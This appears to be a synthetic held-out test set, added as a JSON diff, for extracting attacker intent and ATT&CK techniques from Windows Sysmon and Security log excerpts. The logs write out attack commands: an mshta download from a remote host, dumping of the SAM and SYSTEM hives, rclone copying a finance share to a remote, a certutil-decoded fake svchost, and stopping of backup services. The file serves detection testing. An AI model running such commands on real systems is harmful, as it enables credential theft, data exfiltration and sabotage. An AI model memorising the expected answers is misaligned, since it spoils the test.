@@ -1,0 +1,176 @@
+{
+  "version": "intent-eval-heldout-1.0",
+  "note": "SYNTHETIC held-out set for Part 1: attacks NOT used to tune the prompts or the artifact hints (most have no artifact hint at all), in the same paper-968 record format. Use it to check that intent extraction generalises. Same fields as cases.json.",
+  "cases": [
+    {
+      "id": "H01-execution-mshta-remote-hta",
+      "tactic": "execution",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 1",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Sysmon on host WS-MKT-014 between 10:05 and 10:06 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-MKT-014 User=CORP\\rgomez Image=C:\\Windows\\System32\\mshta.exe CommandLine=mshta.exe http://203.0.113.90/update.hta ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\nEventCode=3 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-MKT-014 Image=C:\\Windows\\System32\\mshta.exe DestinationIp=203.0.113.90 DestinationPort=80\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-MKT-014 User=CORP\\rgomez Image=C:\\Windows\\System32\\wscript.exe CommandLine=wscript.exe C:\\Users\\rgomez\\AppData\\Local\\Temp\\s.js ParentImage=C:\\Windows\\System32\\mshta.exe"
+      },
+      "expected": {
+        "intents": ["suspicious_process_execution", "malware_investigation", "defense_evasion"],
+        "techniques_any": ["T1218.005", "T1218", "T1059.007", "T1059.005", "T1059", "T1204", "T1204.002"],
+        "entities": {"hosts": ["WS-MKT-014"], "users": ["rgomez"], "ips": ["203.0.113.90"], "processes": ["mshta.exe"]},
+        "observed": ["process_telemetry", "network_traffic"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H02-persistence-new-service",
+      "tactic": "persistence",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 2",
+        "description": "SYNTHETIC. Recorded host telemetry: 2 events from Sysmon and Windows Security on host SRV-WEB-04 at 22:40 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-WEB-04 User=CORP\\svc_deploy Image=C:\\Windows\\System32\\sc.exe CommandLine=sc.exe create WinTelemetrySvc binPath= C:\\ProgramData\\wts\\wtsvc.exe start= auto ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=4697 Channel=Security Computer=SRV-WEB-04 SubjectUserName=svc_deploy ServiceName=WinTelemetrySvc ServiceFileName=C:\\ProgramData\\wts\\wtsvc.exe ServiceStartType=2"
+      },
+      "expected": {
+        "intents": ["command_and_control_persistence", "malware_investigation"],
+        "techniques_any": ["T1543.003", "T1543", "T1569.002"],
+        "entities": {"hosts": ["SRV-WEB-04"], "users": ["svc_deploy"], "processes": ["sc.exe"]},
+        "observed": ["process_telemetry", "scheduled_tasks_services"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H03-privesc-new-local-admin",
+      "tactic": "privilege-escalation",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 3",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Windows Security and Sysmon on host WS-FIN-077 between 18:12 and 18:13 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-FIN-077 User=CORP\\pnair Image=C:\\Windows\\System32\\net.exe CommandLine=net localgroup Administrators helpdesk_tmp /add ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=4720 Channel=Security Computer=WS-FIN-077 SubjectUserName=pnair TargetUserName=helpdesk_tmp\nEventCode=4732 Channel=Security Computer=WS-FIN-077 SubjectUserName=pnair TargetUserName=Administrators MemberName=helpdesk_tmp"
+      },
+      "expected": {
+        "intents": ["privilege_escalation", "command_and_control_persistence", "credential_compromise"],
+        "techniques_any": ["T1098", "T1136", "T1136.001", "T1078", "T1078.003"],
+        "entities": {"hosts": ["WS-FIN-077"], "users": ["pnair"], "processes": ["net.exe"]},
+        "observed": ["process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H04-stealth-masquerading-svchost",
+      "tactic": "defense-evasion",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 4",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Sysmon on host WS-ENG-020 between 07:50 and 07:51 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-020 User=CORP\\dkim Image=C:\\Windows\\System32\\certutil.exe CommandLine=certutil.exe -decode C:\\Users\\Public\\b64.txt C:\\Users\\Public\\svchost.exe ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=11 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-020 Image=C:\\Windows\\System32\\certutil.exe TargetFilename=C:\\Users\\Public\\svchost.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ENG-020 User=CORP\\dkim Image=C:\\Users\\Public\\svchost.exe CommandLine=svchost.exe -k netsvcs ParentImage=C:\\Windows\\System32\\cmd.exe"
+      },
+      "expected": {
+        "intents": ["defense_evasion", "malware_investigation", "suspicious_process_execution"],
+        "techniques_any": ["T1036", "T1036.005", "T1140", "T1027"],
+        "entities": {"hosts": ["WS-ENG-020"], "users": ["dkim"], "processes": ["certutil.exe"]},
+        "observed": ["process_telemetry", "file_activity"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H05-credential-access-sam-hive",
+      "tactic": "credential-access",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 5",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Sysmon on host SRV-HR-02 at 23:58 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-HR-02 User=CORP\\adm_lwong Image=C:\\Windows\\System32\\reg.exe CommandLine=reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-HR-02 User=CORP\\adm_lwong Image=C:\\Windows\\System32\\reg.exe CommandLine=reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=11 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-HR-02 Image=C:\\Windows\\System32\\reg.exe TargetFilename=C:\\Windows\\Temp\\sam.save"
+      },
+      "expected": {
+        "intents": ["credential_compromise"],
+        "techniques_any": ["T1003.002", "T1003"],
+        "entities": {"hosts": ["SRV-HR-02"], "users": ["adm_lwong"], "processes": ["reg.exe"]},
+        "observed": ["process_telemetry", "file_activity"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H06-discovery-host-and-network",
+      "tactic": "discovery",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 6",
+        "description": "SYNTHETIC. Recorded host telemetry: 4 events from Sysmon on host WS-OPS-031 between 14:01 and 14:02 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-OPS-031 User=CORP\\jmorris Image=C:\\Windows\\System32\\systeminfo.exe CommandLine=systeminfo ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-OPS-031 User=CORP\\jmorris Image=C:\\Windows\\System32\\ipconfig.exe CommandLine=ipconfig /all ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-OPS-031 User=CORP\\jmorris Image=C:\\Windows\\System32\\tasklist.exe CommandLine=tasklist /v ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-OPS-031 User=CORP\\jmorris Image=C:\\Windows\\System32\\net.exe CommandLine=net view \\\\FS-01 ParentImage=C:\\Windows\\System32\\cmd.exe"
+      },
+      "expected": {
+        "intents": ["discovery"],
+        "techniques_any": ["T1082", "T1016", "T1057", "T1135", "T1018"],
+        "entities": {"hosts": ["WS-OPS-031"], "users": ["jmorris"], "processes": ["systeminfo.exe"]},
+        "observed": ["process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H07-lateral-movement-wmi",
+      "tactic": "lateral-movement",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 7",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Sysmon and Windows Security on hosts WS-ADM-002 and SRV-APP-07 between 15:30 and 15:31 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=WS-ADM-002 User=CORP\\adm_fsilva Image=C:\\Windows\\System32\\wbem\\WMIC.exe CommandLine=wmic /node:SRV-APP-07 process call create \"cmd.exe /c C:\\Windows\\Temp\\p.bat\" ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=4624 Channel=Security Computer=SRV-APP-07 LogonType=3 TargetUserName=adm_fsilva IpAddress=10.20.8.2\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-APP-07 User=CORP\\adm_fsilva Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c C:\\Windows\\Temp\\p.bat ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+      },
+      "expected": {
+        "intents": ["lateral_movement"],
+        "techniques_any": ["T1047", "T1021.006", "T1021", "T1570"],
+        "entities": {"hosts": ["SRV-APP-07"], "users": ["adm_fsilva"], "ips": ["10.20.8.2"], "processes": ["WMIC.exe"]},
+        "observed": ["process_telemetry", "authentication"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H08-impact-service-stop",
+      "tactic": "impact",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 8",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Sysmon on host SRV-DB-05 between 02:15 and 02:16 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-DB-05 User=CORP\\svc_maint Image=C:\\Windows\\System32\\net.exe CommandLine=net stop MSSQLSERVER /y ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-DB-05 User=CORP\\svc_maint Image=C:\\Windows\\System32\\net.exe CommandLine=net stop \"Veeam Backup Service\" /y ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=SRV-DB-05 User=CORP\\svc_maint Image=C:\\Windows\\System32\\taskkill.exe CommandLine=taskkill /f /im sqlservr.exe ParentImage=C:\\Windows\\System32\\cmd.exe"
+      },
+      "expected": {
+        "intents": ["system_impact", "ransomware_investigation"],
+        "techniques_any": ["T1489"],
+        "entities": {"hosts": ["SRV-DB-05"], "users": ["svc_maint"], "processes": ["taskkill.exe"]},
+        "observed": ["process_telemetry"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H09-exfiltration-rclone",
+      "tactic": "exfiltration",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 9",
+        "description": "SYNTHETIC. Recorded host telemetry: 2 events from Sysmon on host FS-03 at 03:44 UTC.",
+        "log_excerpt": "EventCode=1 Channel=Microsoft-Windows-Sysmon/Operational Computer=FS-03 User=CORP\\backup_op Image=C:\\ProgramData\\rc\\rclone.exe CommandLine=rclone.exe copy D:\\Finance remote-mega:/stash --transfers 8 ParentImage=C:\\Windows\\System32\\cmd.exe\nEventCode=3 Channel=Microsoft-Windows-Sysmon/Operational Computer=FS-03 Image=C:\\ProgramData\\rc\\rclone.exe DestinationIp=198.51.100.140 DestinationPort=443"
+      },
+      "expected": {
+        "intents": ["data_exfiltration"],
+        "techniques_any": ["T1567.002", "T1567", "T1048", "T1041", "T1020"],
+        "entities": {"hosts": ["FS-03"], "users": ["backup_op"], "ips": ["198.51.100.140"], "processes": ["rclone.exe"]},
+        "observed": ["process_telemetry", "network_traffic"],
+        "stated_gaps": []
+      }
+    },
+    {
+      "id": "H10-credential-access-kerberoasting",
+      "tactic": "credential-access",
+      "submission": {
+        "source": "log_excerpt",
+        "title": "SYNTHETIC held-out recording 10",
+        "description": "SYNTHETIC. Recorded host telemetry: 3 events from Windows Security on domain controller DC-01 between 11:20 and 11:21 UTC.",
+        "log_excerpt": "EventCode=4769 Channel=Security Computer=DC-01 TargetUserName=tlee@CORP.EXAMPLE ServiceName=svc_sql TicketEncryptionType=0x17 IpAddress=10.20.6.44\nEventCode=4769 Channel=Security Computer=DC-01 TargetUserName=tlee@CORP.EXAMPLE ServiceName=svc_backup TicketEncryptionType=0x17 IpAddress=10.20.6.44\nEventCode=4769 Channel=Security Computer=DC-01 TargetUserName=tlee@CORP.EXAMPLE ServiceName=svc_web TicketEncryptionType=0x17 IpAddress=10.20.6.44"
+      },
+      "expected": {
+        "intents": ["credential_compromise"],
+        "techniques_any": ["T1558.003", "T1558"],
+        "entities": {"hosts": ["DC-01"], "ips": ["10.20.6.44"]},
+        "observed": [],
+        "stated_gaps": []
+      }
+    }
+  ]
+}
